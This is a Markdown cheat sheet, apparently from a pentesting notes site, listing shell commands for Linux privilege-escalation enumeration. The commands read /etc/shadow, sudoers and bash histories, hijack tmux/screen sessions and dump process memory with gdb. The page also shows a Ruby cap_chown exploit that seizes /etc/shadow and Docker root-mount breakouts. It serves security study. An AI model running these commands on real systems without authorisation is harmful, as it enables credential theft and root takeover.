# Manual Checks

{% hint style="info" %}
<mark style="color:blue;">Manual checks can help</mark> <mark style="color:blue;"></mark><mark style="color:blue;">**understand way more how attacks work**</mark><mark style="color:blue;">. Check this out !</mark>
{% endhint %}

## Walkthrough (Kinda)

```bash
# Any useful applications installed? 
which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp tmux screen nmap 2>/dev/null

# sudo rights ?
sudo -l
sudo su
# check sudo version for exploits
sudo -V | grep “Sudo ver”

# check infos about the user
id
wwhoami
w
last
cat /etc/passwd
cat /etc/sudoers
cat /etc/group

# check kernel version
uname -a 
lsb_release -a
cat /proc/version /etc/issue /etc/*-release

# check for files/binaries & clear-text pasword in bash history
ls -la ~/ 
ls -la /var/mail /home/*/ /var/spool/mail /home/*/.bash_history /var

# check those files for hashes
cat /etc/passwd
cat /etc/shadow
ls -la /etc/passwd /etc/shadow

# can we write to the .bashsrc file ? if so, can be executed when us logs in
ls -la /root/.bashrc 
ls -la /home/*/.bashrc
locate .bashrc
find / -name .bashrc -xdev 2>/dev/null

# check app config files
# config.php
# ...

# something is running that we can exploit ?
ps aux | grep root

# localhost open ports ?
netstat -antup
ss

# any useful info in the main bash user files ?
cat /etc/profile 
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout

# check for cronjobs
crontab -l 
ls -alh /var/spool/cron
ls -al /etc/ | grep cron; ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root

# PSPY to to see commands run by other users, cron jobs, etc. in real time
./pspy > pspy-out.txt

# unmounted file-systems ?
cat /etc/fstab

# If NFS is open, check if the target has any open NFS shares, if it does, then mount it to your filesystem
showmount -e X.X.X.X
mount X.X.X.X:/ /tmp/

# check installed apps + versions + running ?
ls -alh /usr/bin/ /sbin/ /var/cache/apt/archives /var/cache/yum/
dpkg -l
rpm -qa

# can we hijack any shell sessions ?
tmux ls
tmux attach -t tmuxname 
screen -ls
screen-dr sessionname
byobu list-session

# some services can save clear-text creds in memory
ps aux # grab the process id
gdb -p SERVICE; gdb PROCID
```

#### Files permissions

{% hint style="info" %}
<mark style="color:blue;">If you fin something interesting, check</mark> [<mark style="color:blue;">**GTFOBins**</mark>](https://gtfobins.github.io/)<mark style="color:blue;">.</mark>
{% endhint %}

```bash
# World writable files directories
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null

# Look for setuid programs (everyone can run them as root)
find / -perm -4000

# World executable folder
find / -perm -o x -type d 2>/dev/null

# World writable and executable folders
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null

# SUID
find / -perm -u=s -type f 2>/dev/null

find . -perm /4000 
```

#### Capabilities

{% hint style="info" %}
<mark style="color:blue;">Check for files with</mark> <mark style="color:blue;"></mark><mark style="color:blue;">**capabilities**</mark><mark style="color:blue;">. These may allow us to access restricted files or directories.</mark>
{% endhint %}

* _Cap\_chown_

```bash
getcap -r / 2>/dev/null
# linpeas /usr/local/bin/ruby = cap_chown+ep 

echo 'File.chown(<User ID>, nil, "/etc/shadow")' > exploit.rb 
ruby exploit.rb 
chmod 777 /etc/shadow
nano /etc/shadow
```

#### Docker

```bash
docker run -it -v /:/mnt bash chroot

docker run -v /root:/mnt -it bash
```

{% embed url="https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout" %}

{% embed url="https://github.com/stealthcopter/deepce" %}
